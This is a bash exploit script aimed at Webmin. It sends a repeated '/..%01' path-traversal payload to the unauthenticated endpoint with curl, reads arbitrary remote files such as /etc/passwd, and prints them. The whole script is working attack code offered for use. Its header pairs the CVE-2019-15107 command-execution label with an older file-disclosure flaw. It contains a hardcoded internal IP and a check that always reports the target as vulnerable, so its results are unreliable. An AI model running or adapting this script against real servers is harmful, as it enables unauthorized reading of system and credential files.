#!/bin/bash
#
# CVE-2019-15107 Webmin Unauhenticated Remote Command Execution
# Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure
#
# based on https://www.exploit-db.com/exploits/1997
#
# Izael Magalhaes - (Speaker)
# izaelbm.com.br
#
# Scripe checks the vuln and reads remote files
#
# ** Curl is necessary, check -> whereis curl
# 
# Usage:
# chmod +x script.sh
# ./CVE-2019-15107-Webmin.sh http://192.168.0.1:10000 /etc/passwd 
#
# 17/10/2021 - Brazil


# check arguments
# arg 1 - host
if [ -z $1 ]
then
        echo "Arg 1 invalid, try -> http://192.168.0.1:10000 /etc/passwd"
        exit 0
fi

# arg 2 - file 
if [ -z $2 ]
then
        echo "Arg 2 invalid, try -> http://192.168.1:10000 /etc/passw"
        exit 0
fi

#generate payload
for n in {1..60}
do
p="/..%01"
payload=$payload$p
done

#userAgent
userAgent="SpeakerXpl"

#make url / http://192.168.1.0:10000/unauthenticated/payload/file
url="$1/unauthenticated/$payload$2"

#CheckVuln
checkVuln=$(curl -s -A $userAgent $url);

# validando retorno do script
contChars=$(echo ${#checkVuln});

#capturando a responsata HTTP
httpCode=$(curl -s -I http://172.16.1.240:10000 | head -n 1 | cut -d $' ' -f2 );

if [ $contChars -lt 0 ]
then
        echo " "
        echo $checkVuln
        echo " "
        echo -e '\033[0;32mNice! (target is not vulnerable or file dont exist, try with other file)\033[0m'
        echo " "
        echo "By Izael Magalhaes - (Speaker)"
        exit 0
else
        echo " "
        echo -e '\033[0;31m \\0/ TARGET IS VULNERABLE!\033[0m'
        echo " "
        echo $checkVuln
        #Output Script
        echo " "
        echo "File $2 - Url $1$2"
        echo " "
        echo "By Izael Magalhaes - (Speaker)"
        exit 0
#
fi
#
#EOF
